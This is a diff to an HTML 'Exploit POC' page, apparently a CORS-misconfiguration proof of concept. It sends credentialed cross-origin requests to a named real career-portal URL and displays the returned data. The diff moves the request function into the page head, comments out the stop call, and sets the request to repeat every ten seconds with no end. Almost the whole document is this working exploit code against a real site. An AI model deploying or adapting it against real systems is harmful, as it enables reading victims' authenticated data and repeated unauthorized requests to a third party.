@@ -2,6 +2,19 @@
 <html>
    <head>
       <title>Exploit POC</title>
+      <script>
+         function cors() {
+                var xhttp = new XMLHttpRequest();
+                        xhttp.onreadystatechange = function() {
+                                if (this.readyState == 4 && this.status == 200) {
+                                        document.getElementById("mainDiv").innerHTML = alert(this.responseText);
+                }
+         };
+         xhttp.open("GET", "https://www.inditexcareers.com/portalweb/combo/cacheeeeeeeeeeee", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
 </head>
    <body>
       <center>
@@ -14,26 +27,15 @@
 <center> <h3> Loading...27%</h3></ceneter
  </div>
     <script>
- function cors() {
-                var xhttp = new XMLHttpRequest();
-                        xhttp.onreadystatechange = function() {
-                                if (this.readyState == 4 && this.status == 200) {
-                                        document.getElementById("mainDiv").innerHTML = alert(this.responseText);
-                }
-         };
-         xhttp.open("GET", "https://www.inditexcareers.com/portalweb/combo/cacheeeeeeeeeeee", true);
-         xhttp.withCredentials = true;
-         xhttp.send();
-         }
-function pool(){
-for (let i=0; i < 5000; i++){
-cors();
-console.log(i);
-}
-}
-var myVar = setInterval(cors, 1000); //setting the loop with time interval
+//function pool(){
+//for (let i=0; i < 5000; i++){
+//cors();
+//console.log(i);
+//}
+//}
+var myVar = setInterval(cors, 10000); //setting the loop with time interval to run every 10 secs
 
-clearInterval(myVar); //call this line to stop the loop
+//clearInterval(myVar); //call this line to stop the loop
 </script>
    </body>
 </html>
